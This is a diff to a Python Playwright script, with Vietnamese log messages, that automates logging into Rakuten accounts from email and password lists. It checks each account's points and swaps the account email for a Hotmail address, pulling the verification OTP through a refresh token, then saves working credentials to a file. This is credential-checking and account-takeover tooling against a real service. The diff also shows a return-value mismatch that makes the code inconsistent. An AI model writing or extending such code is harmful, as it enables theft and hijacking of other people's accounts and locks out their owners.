@@ -406,7 +406,8 @@ def check_rakuten_account(browser, context, page, email, password, hotmail=None)
                     time.sleep(5)  # Wait before retry
 
         time.sleep(random.randint(2, 5))
-        
+        is_valid_hot_mail = False
+        result = True, "Đăng nhập thành công"
         # Step 1: Enter email
         if not _enter_email(page, email):
             result = False, f"Lỗi nhập email cho {email}"
@@ -421,11 +422,13 @@ def check_rakuten_account(browser, context, page, email, password, hotmail=None)
             result = _check_points(page, email, password)
             # Step 5: Change Email
             if hotmail:
-                _change_email(page, email, password, hotmail)
+                result, _ = _change_email(page, email, password, hotmail)
+                if result:
+                    is_valid_hot_mail = True
         
         _remove_account_from_file(email)        
-        return result
-            
+        return result, is_valid_hot_mail
+
     except Exception as e:
         logging.error(f"❌ Lỗi trong quá trình kiểm tra cho {email}: {repr(e)}")
         # Remove account even if there's an exception
@@ -702,7 +705,7 @@ def _change_email(page, email, password, hotmail):
             new_email, _, refresh_token, client_id = hotmail.split('|')
         except Exception:
             logging.error(f"Lỗi parse hotmail string: {hotmail}")
-            return
+            return False, "Lỗi parse hotmail string"
 
         page.goto("https://profile.id.rakuten.co.jp/account-security", timeout=60000)
         time.sleep(3)
@@ -717,9 +720,9 @@ def _change_email(page, email, password, hotmail):
             page.wait_for_selector('[data-qa-id="email-edit-field"]', timeout=15000)
             page.click('[data-qa-id="email-edit-field"]')
             time.sleep(1.5)
-        except Exception as e:
+        except Exception as e: 
             logging.error(f"Không tìm thấy nút sửa email: {repr(e)}")
-            return
+            return False, "Không tìm thấy nút sửa email"
 
         # Wait for email input and type new email
         try:
@@ -728,7 +731,7 @@ def _change_email(page, email, password, hotmail):
             time.sleep(0.8)
         except Exception as e:
             logging.error(f"Lỗi khi nhập email mới: {repr(e)}")
-            return
+            return False, "Lỗi khi nhập email mới"
 
         # Click submit update email
         try:
@@ -736,14 +739,14 @@ def _change_email(page, email, password, hotmail):
             page.click('[data-qa-id="submit-update-email"]')
         except Exception as e:
             logging.error(f"Không tìm thấy nút submit update email: {repr(e)}")
-            return
+            return False, "Không tìm thấy nút submit update email"
 
         hotmail_obj = Hotmail(email, password, refresh_token, client_id)
 
         otp_code = _get_otp_from_hotmail(hotmail_obj)
         if not otp_code:
             logging.error(f"Không lấy được OTP từ hotmail cho {email}")
-            return
+            return False, "Không lấy được OTP từ hotmail"
 
         try:
             page.wait_for_selector('#VerifyCode', timeout=60000)
@@ -754,12 +757,13 @@ def _change_email(page, email, password, hotmail):
             logging.info(f"Đã gửi OTP để xác thực email cho {email}")
         except Exception as e:
             logging.error(f"Lỗi khi nhập/submit OTP cho {email}: {repr(e)}")
-            return
+            return False, "Lỗi khi nhập/submit OTP"
 
+        return True, f"Đã đổi email thành công thành {new_email}"
     except Exception as e:
         logging.error(f"Lỗi khi đổi email cho {email}: {repr(e)}")
-        return
-    
+        return False, "Lỗi khi đổi email"
+
 
 hotmail_need_deletes = []
 
@@ -770,10 +774,10 @@ def process_account(browser, context, page, user_data_dir, playwright, account, 
     logging.info(f"Sử dụng hotmail: {hotmail} cho tài khoản {email}")
     try:
         logging.debug(f"Đang xử lý tài khoản {account_index + 1}: {email}")
-        success, message = check_rakuten_account(browser, context, page, email, password, hotmail)
+        success, message, is_valid_hot_mail = check_rakuten_account(browser, context, page, email, password, hotmail)
         if not success:
             logging.warning(f"Đăng nhập thất bại cho {email}: Acc Die")
-        else:
+        elif is_valid_hot_mail:
             hotmail_need_deletes.append(hotmail)
 
         with file_lock:
@@ -781,12 +785,12 @@ def process_account(browser, context, page, user_data_dir, playwright, account, 
                 successful_accounts.append(account)
                 # Lưu tài khoản thành công
                 with open('successful_accounts.txt', 'a', encoding='utf-8') as f:
-                    f.write(f"{email}|{password}|{message}|{hotmail}\n")
+                    f.write(f"{email}|{password}|{message}|{hotmail if is_valid_hot_mail else ''}\n")
             else:
                 failed_accounts.append({'account': account, 'error': message})
                 # Lưu tài khoản thất bại
                 with open('failed_accounts.txt', 'a', encoding='utf-8') as f:
-                    f.write(f"{email}|{password}|{message}|{hotmail}\n")
+                    f.write(f"{email}|{password}|{message}|{hotmail if is_valid_hot_mail else ''}\n")
         logging.info(f"Hoàn tất xử lý tài khoản: {email}")
     except Exception as e:
         logging.error(f"Lỗi xử lý tài khoản {email}: {repr(e)}")
